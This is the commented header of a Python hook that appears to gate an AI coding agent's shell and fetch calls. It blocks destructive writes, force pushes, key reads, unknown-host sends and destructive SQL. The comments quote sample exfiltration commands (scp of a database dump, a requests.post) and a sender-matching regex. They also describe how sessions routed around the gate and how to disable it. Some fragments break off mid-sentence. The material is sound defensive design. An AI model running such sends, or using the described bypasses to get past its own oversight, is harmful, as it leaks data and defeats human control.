"""guard-unattended.py — the PreToolUse deny gate (idea-bank #32, second job).

WHY THIS EXISTS. Everything else that constrains a session in this system is
compliance-dependent: doctrine, taught rules, the compiled-rules recitation, the
writing-lint gate. All of them work only if the session chooses to obey. On
2026-08-02 an audit found ten claims relayed as verified that were not, which is
what compliance-dependent control looks like when it fails. A hook is the only
mechanism here the model cannot reason its way around, because the harness runs
it, not the model.

WHAT IT BLOCKS. Five classes that are never correct for a session to do on its
own, unattended or not:
  1. Destructive filesystem writes outside the sanctioned scratch zones.
  2. History-rewriting or force git operations.
  3. Reads of private key material.
  4. Network sends to hosts outside the known set (the exfiltration guard).
  5. Destructive SQL (DROP / TRUNCATE / unqualified DELETE or UPDATE).

WHAT IT DELIBERATELY DOES NOT BLOCK. Ordinary database WRITES. Step 1 of the
nightly chain is `cadence_engine.py --apply`, which writes by design. A naive
"no writes when unattended" rule would kill the chain at 2am. The distinction
this gate draws is destructive-or-exfiltrating, never write-versus-read.

THE NIGHTLY CHAIN IS EXPLICITLY SAFE. Its command string is
`cd ~/carr-system && ./bin/nightly.sh >/dev/null 2>&1; echo "direct script exit=$?"`
and it carries a persisted permission approval that must stay byte-identical.
It matches no pattern below. It is also allowlisted by exact string as a second
belt, so a future pattern cannot accidentally catch it.

KNOWN LIMIT, STATED HONESTLY. This sees the command the SESSION issues, not what
a script does internally. `nightly.sh` runs git, pg_dump and R2 uploads inside
itself and this gate never sees them. That is the correct scope: the threat model
is a session taking a destructive action, not the reviewed scripts in this repo.

FAILS OPEN, ON PURPOSE. Any internal error allows the call. A gate that wedges
the 2am chain costs more than the marginal safety of failing closed, on a
single-operator machine that is not a hostile environment. Every allow-on-error
is logged so a silently-degraded gate is still discoverable.

DISABLE FAST: remove the hooks block from settings.json, or `chmod -x` this file
(a non-executable hook errors, and this gate fails open).

# ── IS THIS COMMAND ACTUALLY SENDING? (loop #283, fixed 2026-08-13) ───────────
#
# THE BUG THIS REPLACES, and it was a false positive that blocked real work every
# time it fired. The old test was:
#
#     SEND_CTX = re.compile(r"\b(curl|wget|http|https)\b", re.I)
#
# `http` and `https` as bare words appear inside EVERY quoted URL, so any command
# that merely MENTIONED a link was treated as a network send and then had to pass
# every host in it through the allowlist. Found 2026-08-09 by the
# linkedin-engagement-daily run: it assembled its own deliverable — open a local
# file, concatenate strings, write it back — and was refused with "network send to
# an unrecognised host (www.linkedin.com)". No network call was made or attempted.
# That routine's own SOP mandates a permalink per item, so every run hit it, and
# the x-reply run stores post links the same way.
#
# WHY NOT JUST ALLOWLIST linkedin.com. Because that widens REAL egress to fix a
# case where no egress happens, and leaves every other URL-quoting file write
# still broken. The loop names the right fix and this is it: decide from the
# command's EXECUTABLE first, and only then look at hostnames.
#
# THE SENDER TEST. A sender name counts only in COMMAND POSITION — at the start of
# the command, or after a pipe, semicolon, `&&`, `||`, a subshell opener, or one
# of the usual prefix words (sudo/env/xargs/time/nohup) — optionally with a
# leading path. That is what keeps `https` in `"see https://example.com"` from
# matching while `curl`, `/usr/bin/curl` and `... | xargs curl` all still do.
# `http`/`https` REMAIN senders in command position, because httpie's client is
# literally named `http` and dropping it would open a real hole.

# AN INTERPRETER THAT IMPORTS A NETWORK CLIENT IS ALSO A SENDER, and this half is
# what keeps the narrower executable test from becoming a hole: `python3 -c "import
# requests; requests.post(...)"` has no sender in command position. Matching the
# library reference catches it. A `python3 -c` that only opens a local file and
# writes a string — the exact shape loop #283 was about — matches neither and is

# so `scp db.sql user@host:/tmp` named no host, passed the allowlist by having
# nothing to check, and was allowed. Found 2026-08-13 by writing
# ops/egress-scope-selftest.py, which asserted the property the guard was assumed
# to have; the assertion failed and the assumption was wrong.
#
# Deliberately narrow: it matches the `user@host:` form that scp and rsync use for

# patterns scan the whole command string, so `\btruncate\s+(table\s+)?\w` matched
# the ENGLISH PHRASE "truncate honestly" inside a loop's closing outcome, and the
# session could not file it. No SQL was involved anywhere in that command.
#
# The patterns themselves are right and are NOT loosened: a real TRUNCATE, DROP,
# unqualified DELETE or unqualified UPDATE stays blocked. What changes is that they
# are consulted only when the command plausibly EXECUTES SQL at all. Prose that
# quotes a SQL keyword is not a database operation, exactly as prose that quotes a
# URL is not a network send.
#

# database, names a .sql file, or executes a statement string qualifies.

# consulted against the part of the command the shell will actually EXECUTE,
# because a quoted --body and a heredoc body are handed to a program as bytes.
#
# Measured on 2026-08-14, three times in one session: a pull-request body
# reporting a fix to the writer gate, a comment verifying that fix had landed,
# and a probe command investigating this very guard were each refused for
# naming the command they were about. The workaround every time was moving the
# text into a file, which is precisely how a gate teaches people to route
# around it — and a gate people route around has already stopped working.
#
# THE CATASTROPHIC LABELS ARE DELIBERATELY ABSENT from this set: filesystem
# format, raw device write and the two private-key rules keep no carve-out at

# ── THE WEBFETCH READ-ONLY CLASS (2026-08-09, Joe: "build A and B") ──────────
#
# THE ERROR THIS FIXES. Until now WebFetch and Bash `curl` shared ONE allowlist,
# and that forced the list to be as tight as the riskiest caller. Their
# exfiltration ceilings are not remotely comparable:
#
#     WebFetch   GET only · payload out = the URL string · no credentials ·
#                cross-host redirects are RETURNED to the caller, not followed
#                (observed live twice on 2026-08-07 against alabamainteractive)
#     Bash curl  any method · any body · credentials · follows redirects
#
# The guard's own stated job (see the header, class 4) is the EXFILTRATION
# guard. A GET whose entire outbound payload is a URL is a different risk from a
# POST that can carry a database, so it gets a different policy. KNOWN_HOSTS is
# untouched and still governs Bash.
#
# WHAT THIS BUYS. Client verification needs the practice's own website, and
# practice websites cannot be enumerated — there is a different one per client,
# unknown until the client exists. An allowlist can never close that; a policy
# can. This is what makes the weekly deal-history research slice able to read a
# practice site at all.
#
# THE EXFILTRATION CONTROL IS THE LENGTH CAP, not the host list. If a GET can
# only leave with what fits in its URL, then capping the URL caps the channel.
# 256 chars total with a near-empty query admits ordinary pages and refuses a
# payload. Everything else here is the SSRF floor.
#
# KNOWN LIMIT, STATED PLAINLY: a hostname that RESOLVES to a private address
# (DNS rebinding) is not caught. Resolving in a PreToolUse hook would add a
# network round-trip to every call and is itself resolver-dependent. The bare-IP

# ── Rebasing your own branch in place ────────────────────────────────────────
#
# WHY THIS CARVE-OUT EXISTS (measured 2026-08-15). The "force push" rule above is
# blanket: it cannot see WHERE the push lands, so it refused a force-push at a
# session's own feature branch exactly as hard as one aimed at main. main takes
# roughly a hundred commits a day here, so a branch going stale mid-review is the
# normal case — and the standard repair, `git rebase origin/main` then force-push
# the SAME branch, was unavailable. The only route left was to abandon the branch,
# cut a new one and open a second pull request.
#
# That is a corpse factory, and it is not a theory: four closed pull requests say
# it in their own closing notes, in the same words — "reopened on a fresh branch
# because rewriting the pushed one needs a force-push, which the unattended guard
# blocks" (#125, #131, #142, #100). GitHub's auto-delete fires on MERGE and never
# on close, so every one of those left a permanent orphan. 25 closed pull requests
# and 35 dead branches were swept by hand on 2026-08-15. The guard was
# manufacturing the mess, and no amount of sweeping addresses that.
#
# WHAT IS DELIBERATELY *NOT* WIDENED, because the point is to remove a
# manufacturing defect rather than to hand back the whole capability:
#
#   main and master           — still refused. The server ruleset also forbids it,
#                               and belt-and-braces is right for the one ref whose
#                               history everything else is measured against.
#   bare --force / -f         — still refused even at a feature branch. Lease is
#                               the whole safety story: it aborts when the remote
#                               moved under you, which is the only thing standing
#                               between a rebase and a peer session's pushed work.
#                               Bare force has no such check and many sessions
#                               share this machine.
#   +refspec                  — still refused; same overwrite, no lease.
#   no named target           — still refused. Without an explicit ref the push
#                               takes the current branch, which the guard cannot
#                               see and which may be main. Naming it is the same
#                               house rule as committing by named paths, and it
#                               makes this decision auditable after the fact.
